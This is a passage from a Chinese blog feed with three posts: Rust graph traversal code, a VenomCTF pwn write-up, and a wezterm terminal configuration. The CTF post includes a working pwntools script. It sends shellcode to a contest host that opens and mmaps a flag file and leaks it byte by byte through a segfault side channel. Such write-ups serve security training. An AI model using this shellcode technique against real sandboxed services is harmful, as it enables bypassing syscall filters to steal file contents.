    <span class="token keyword">let</span> <span class="token keyword">mut</span> visited <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> queue <span class="token operator">=</span> <span class="token class-name">VecDeque</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> result <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> spanning_tree <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    queue<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换为 0-based 索引</span>
    visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> queue<span class="token punctuation">.</span><span class="token function">pop_front</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换回 1-based 索引</span>

        <span class="token comment">// 遍历所有邻居</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node_ptr<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> neighbor <span class="token operator">=</span> node_ptr<span class="token punctuation">.</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>neighbor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>
                queue<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>
                spanning_tree<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Edge</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> neighbor <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            current <span class="token operator">=</span> <span class="token operator">&amp;</span>node_ptr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token punctuation">(</span>result<span class="token punctuation">,</span>spanning_tree<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_bfs</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> edges<span class="token punctuation">:</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span> <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> g <span class="token operator">=</span> <span class="token class-name">Graph</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    g<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span>edges<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">let</span> bfs_result <span class="token operator">=</span> g<span class="token punctuation">.</span><span class="token function">bfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>bfs_result<span class="token number">.0</span><span class="token punctuation">,</span><span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> expected_edges <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token class-name">Edge</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>bfs_result<span class="token number">.1</span><span class="token punctuation">,</span> expected_edges<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现"><a href="#借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现" class="headerlink" title="借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现"></a>借助于栈类型（自己定义和实现）将深度优先遍历用非递归算法实现</h2><p>没想到什么优雅地记录生成树的办法，只能使用额外的空间记录每个节点的父节点<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"> <span class="token keyword">fn</span> <span class="token function-definition function">dfs_aio</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">,</span> start<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span><span class="token punctuation">-></span> <span class="token punctuation">(</span><span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token keyword">usize</span><span class="token operator">></span><span class="token punctuation">,</span> <span class="token class-name">Vec</span><span class="token operator">&lt;</span><span class="token class-name">Edge</span><span class="token operator">></span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> visited <span class="token operator">=</span> <span class="token class-name">HashSet</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> stack <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> result <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> spanning_tree <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> parent <span class="token operator">=</span> <span class="token macro property">vec!</span><span class="token punctuation">[</span><span class="token class-name">None</span><span class="token punctuation">;</span> <span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">.</span><span class="token function">len</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>start <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换为 0-based 索引</span>

    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> stack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        visited<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
        result<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 转换回 1-based 索引</span>

        <span class="token comment">// 记录生成树边（如果不是起始节点）</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>parent_node<span class="token punctuation">)</span> <span class="token operator">=</span> parent<span class="token punctuation">[</span>node<span class="token punctuation">]</span> <span class="token punctuation">&#123;</span>
            spanning_tree<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token class-name">Edge</span><span class="token punctuation">(</span>parent_node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> node <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 将邻居按逆序压入栈中</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> neighbors <span class="token operator">=</span> <span class="token class-name">Vec</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>vertices<span class="token punctuation">[</span>node<span class="token punctuation">]</span><span class="token punctuation">.</span>first<span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node_ptr<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> neighbor <span class="token operator">=</span> node_ptr<span class="token punctuation">.</span>index <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token operator">!</span>visited<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>neighbor<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                neighbors<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token comment">// 记录父节点关系</span>
                parent<span class="token punctuation">[</span>neighbor<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
            current <span class="token operator">=</span> <span class="token operator">&amp;</span>node_ptr<span class="token punctuation">.</span>next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token comment">// 逆序压入栈</span>
        <span class="token keyword">for</span> neighbor <span class="token keyword">in</span> neighbors<span class="token punctuation">.</span><span class="token function">iter</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rev</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            stack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token operator">*</span>neighbor<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token punctuation">(</span>result<span class="token punctuation">,</span> spanning_tree<span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="实现有向图的遍历操作"><a href="#实现有向图的遍历操作" class="headerlink" title="实现有向图的遍历操作"></a>实现有向图的遍历操作</h2><p>以上均适配有向图操作</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;实现一个邻接表&quot;&gt;&lt;a href=&quot;#实现一个邻接表&quot; class=&quot;headerlink&quot; title=&quot;实现一个邻接表&quot;&gt;&lt;/a&gt;实现一个邻接表&lt;/h2&gt;&lt;p&gt;基本结构，一个链表头结点vec代指每个顶点&lt;br&gt;&lt;pre class=&quot;line-numbers</summary>
        
      
    
    
    
    <category term="从0开始的rust之旅" scheme="https://aucept.in/categories/%E4%BB%8E0%E5%BC%80%E5%A7%8B%E7%9A%84rust%E4%B9%8B%E6%97%85/"/>
    
    
    <category term="rust" scheme="https://aucept.in/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>VenomCTF WP</title>
    <link href="https://aucept.in/2025/11/15/VenomCTF-WP/"/>
    <id>https://aucept.in/2025/11/15/VenomCTF-WP/</id>
    <published>2025-11-15T11:57:27.340Z</published>
    <updated>2025-11-18T03:57:22.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="good-night"><a href="#good-night" class="headerlink" title="good_night"></a>good_night</h2><p>初看朝阳东升，不解题中意，再看四野寂寂，已成题中人</p>
<p>指早八看到这道题晚八还没解出来，good night</p>
<p>程序有栈溢出，反复地读然后复制到会越界的地方，约等于一个多一字节溢出，可以把返回地址改成<code>leave ret</code></p>
<p>然后给了一个bss段读，可以进行布置，开始rop。</p>
<p>题目说预期解是ret2ld，又提示可以考虑使用ret2dl来泄漏libc地址，再提示ret2dl不单可以调用函数也可以尝试调用libc中的gadget，总结下来就是不会</p>
<h2 id="never"><a href="#never" class="headerlink" title="never"></a>never</h2><p>一个沙盒环境，禁了execve、read、write及部分变体，然后给了一个固定的页并执行</p>
<p>考虑ORW，open没有禁，read可以用mmap映射完成读，但是w缺失，考虑用一些状态间接反应</p>
<p>调试时发现程序段错误会有输出，启动脚本会报错，所以经过设计，逐字节mmap 当前目录下的flag文件，然后和指定字符比较，如果一致转去执行一个触发段错误的指令，不一致则exit，无报错输出</p>
<p>然后爆破：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">,</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'splitw'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

HOST <span class="token operator">=</span> <span class="token string">'47.98.117.93'</span>
PORT <span class="token operator">=</span> <span class="token number">53698</span>

<span class="token keyword">def</span> <span class="token function">test_char</span><span class="token punctuation">(</span>position<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span> test_value<span class="token operator">=</span><span class="token number">102</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">"""测试指定位置的字符是否等于test_value"""</span>
    
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"测试: flag[</span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">] == </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string"> ('</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">chr</span><span class="token punctuation">(</span>test_value<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">')?"</span></span><span class="token punctuation">)</span>
    
    s <span class="token operator">=</span> remote<span class="token punctuation">(</span>HOST<span class="token punctuation">,</span> PORT<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"ideas!"</span><span class="token punctuation">)</span>
    
    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'''
        mov r14, 0xDEADB800
        mov dword ptr [r14], 0x67616c66
        
        mov r15, 0xDEADB100
        mov byte ptr [r15], 0x0f
        mov byte ptr [r15+1], 0x05
        mov byte ptr [r15+2], 0xc3
        
        mov rdi, 0xDEADB800
        xor rsi, rsi
        mov rax, 2
        call r15
        mov r12, rax
        
        xor rdi, rdi
        mov rsi, 100
        mov rdx, 1
        mov r10, 2
        mov r8, r12
        xor r9, r9
        mov rax, 9
        call r15
        
        mov rbx, rax
        add rbx, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>position<span class="token punctuation">&#125;</span></span><span class="token string">
        mov dl, byte ptr [rbx]
        mov cl, </span><span class="token interpolation"><span class="token punctuation">&#123;</span>test_value<span class="token punctuation">&#125;</span></span><span class="token string">
        cmp dl, cl
        je crash
        
        xor rdi, rdi
        mov rax, 60
        call r15
        
        crash:
        mov rax, 0xdeadbeef
        mov rbx, qword ptr [rax]
    '''</span></span><span class="token punctuation">)</span>
    
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>shellcode<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'\x90'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
    s<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    test_char<span class="token punctuation">(</span>?<span class="token punctuation">,</span>?<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="magic"><a href="#magic" class="headerlink" title="magic"></a>magic</h2><p>除了一个栈溢出似乎什么也没有</p>
<p>提示需要用到两个magic gadget</p>
<p>找了半天只找到一个<code>add DWORD PTR [rbp-0x3d],ebx</code>，不会用</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>坏消息是只解出一道题</p>
<p>好消息是pwn的三道题除了这道never都是0解，magic甚至官方没放wp（打算明年接着用……</p>
]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h2 id=&quot;good-night&quot;&gt;&lt;a href=&quot;#good-night&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="ctf" scheme="https://aucept.in/categories/ctf/"/>
    
    
    <category term="pwn" scheme="https://aucept.in/tags/pwn/"/>
    
    <category term="orw" scheme="https://aucept.in/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>wezterm配置</title>
    <link href="https://aucept.in/2025/11/12/wezterm%E9%85%8D%E7%BD%AE/"/>
    <id>https://aucept.in/2025/11/12/wezterm%E9%85%8D%E7%BD%AE/</id>
    <published>2025-11-12T10:52:50.000Z</published>
    <updated>2025-11-18T04:00:26.377Z</updated>
    
    <content type="html"><![CDATA[<p>每天看着暗红色的终端喜新厌旧了，感觉流离用的fish命令提示功能，还有在别人博客上经常看到的暗蓝色的都好酷，正如本文的分类，家要有家的样子，遂重新配置我的终端！</p>
<p>为什么选wezterm呢？因为它用rust实现，用lua写配置文件——因为喜欢</p>
<p><a href="https://wezterm.org/install/linux.html">官方安装文档</a></p>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p>需要在~下创建一个配置文件.wezterm.lua，windows在%USERPROFILE%下</p>
<p>嗯，用lua做配置文件，也就意味着配置参数里可以塞很多复杂的逻辑，极其灵活，赞</p>
<p>贴一下我的：<br><pre class="line-numbers language-lua" data-language="lua"><code class="language-lua"><span class="token keyword">local</span> wezterm <span class="token operator">=</span> require <span class="token string">'wezterm'</span>
<span class="token keyword">local</span> config <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>

<span class="token comment">-- 基础设置</span>
config<span class="token punctuation">.</span>enable_tab_bar <span class="token operator">=</span> <span class="token keyword">true</span>
config<span class="token punctuation">.</span>hide_tab_bar_if_only_one_tab <span class="token operator">=</span> <span class="token keyword">true</span>
config<span class="token punctuation">.</span>use_fancy_tab_bar <span class="token operator">=</span> <span class="token keyword">true</span>  <span class="token comment">-- false 为简洁样式</span>
config<span class="token punctuation">.</span>tab_bar_at_bottom <span class="token operator">=</span> <span class="token keyword">false</span>  <span class="token comment">-- true 将标签栏放底部</span>
config<span class="token punctuation">.</span>tab_max_width <span class="token operator">=</span> <span class="token number">25</span>


<span class="token comment">-- 启动设置 (Windows)</span>
config<span class="token punctuation">.</span>default_prog <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'wsl.exe'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'Ubuntu'</span><span class="token punctuation">,</span> <span class="token string">'--cd'</span><span class="token punctuation">,</span> <span class="token string">'/home/auceptin_fang'</span><span class="token punctuation">,</span><span class="token string">'--'</span><span class="token punctuation">,</span> <span class="token string">'fish'</span> <span class="token punctuation">&#125;</span>

<span class="token comment">-- 字体设置</span>
config<span class="token punctuation">.</span>font <span class="token operator">=</span> wezterm<span class="token punctuation">.</span><span class="token function">font_with_fallback</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token string">'Cascadia Code'</span><span class="token punctuation">,</span>  <span class="token comment">-- Windows 自带</span>
  <span class="token string">'Consolas'</span><span class="token punctuation">,</span>       <span class="token comment">-- Windows 自带</span>
  <span class="token string">'Courier New'</span><span class="token punctuation">,</span>    <span class="token comment">-- Windows 自带</span>
  <span class="token string">'Microsoft YaHei UI'</span><span class="token punctuation">,</span>
  <span class="token string">'SimSun'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

config<span class="token punctuation">.</span>font_size <span class="token operator">=</span> <span class="token number">14.0</span>
config<span class="token punctuation">.</span>line_height <span class="token operator">=</span> <span class="token number">1.2</span>  <span class="token comment">-- 行高倍数</span>
config<span class="token punctuation">.</span>cell_width <span class="token operator">=</span> <span class="token number">1.0</span>   <span class="token comment">-- 字符宽度倍数</span>

<span class="token comment">-- 字体特性（连字等）</span>
config<span class="token punctuation">.</span>harfbuzz_features <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token string">'calt=1'</span><span class="token punctuation">,</span> <span class="token string">'clig=1'</span><span class="token punctuation">,</span> <span class="token string">'liga=1'</span> <span class="token punctuation">&#125;</span>

<span class="token comment">-- 性能配置</span>
config<span class="token punctuation">.</span>front_end <span class="token operator">=</span> <span class="token string">"WebGpu"</span> 
config<span class="token punctuation">.</span>max_fps <span class="token operator">=</span> <span class="token number">60</span>
config<span class="token punctuation">.</span>animation_fps <span class="token operator">=</span> <span class="token number">60</span>
config<span class="token punctuation">.</span>enable_kitty_graphics <span class="token operator">=</span> <span class="token keyword">false</span>

<span class="token comment">-- 配色方案</span>

config<span class="token punctuation">.</span>color_scheme <span class="token operator">=</span> <span class="token string">"Tokyo Night"</span>

<span class="token comment">-- config.color_scheme = 'Batman'</span>
<span class="token comment">-- config.color_scheme = "Catppuccin Mocha"</span>
<span class="token comment">-- config.color_scheme = "Dracula"</span>
<span class="token comment">-- config.color_scheme = "Nord"</span>
<span class="token comment">-- config.color_scheme = "Gruvbox Dark"</span>
<span class="token comment">-- config.color_scheme = "One Dark"</span>
<span class="token comment">-- config.color_scheme = "Solarized Dark"</span>


<span class="token comment">--[[ 自定义颜色
config.colors = &#123;
  foreground = '#c0caf5',
  background = '#1a1b26',
  cursor_bg = '#c0caf5',
  cursor_border = '#c0caf5',
  cursor_fg = '#1a1b26',
  selection_bg = '#33467C',
  selection_fg = '#c0caf5',
&#125;
]]</span>


<span class="token comment">-- 背景透明度</span>
config<span class="token punctuation">.</span>window_background_opacity <span class="token operator">=</span> <span class="token number">0.94</span>  

<span class="token comment">-- 如果要使用背景图片，取消注释下面几行：</span>
<span class="token comment">-- config.window_background_image = 'C:/'</span>
<span class="token comment">-- config.window_background_image_hsb = &#123;</span>
<span class="token comment">--   brightness = 0.3,  -- 建议 0.3-0.5</span>
<span class="token comment">--   hue = 1.0,</span>
<span class="token comment">--   saturation = 1.0,</span>
<span class="token comment">-- &#125;</span>

<span class="token comment">-- 如果要透明效果，设置 0.85-0.95：</span>
<span class="token comment">-- config.window_background_opacity = 0.92</span>

<span class="token comment">-- 光标设置</span>
config<span class="token punctuation">.</span>default_cursor_style <span class="token operator">=</span> <span class="token string">'BlinkingBlock'</span> <span class="token comment">-- 闪烁</span>
config<span class="token punctuation">.</span>cursor_blink_rate <span class="token operator">=</span> <span class="token number">500</span>
config<span class="token punctuation">.</span>cursor_blink_ease_in <span class="token operator">=</span> <span class="token string">'Ease'</span>  <span class="token comment">-- 淡入效果：'Constant', 'Linear', 'Ease', 'EaseIn', 'EaseOut', 'EaseInOut'</span>
config<span class="token punctuation">.</span>cursor_blink_ease_out <span class="token operator">=</span> <span class="token string">'Constant'</span>  <span class="token comment">-- 淡出效果</span>

<span class="token comment">-- 窗口设置</span>
config<span class="token punctuation">.</span>window_decorations <span class="token operator">=</span> <span class="token string">"RESIZE"</span>
config<span class="token punctuation">.</span>window_padding <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
  left <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>
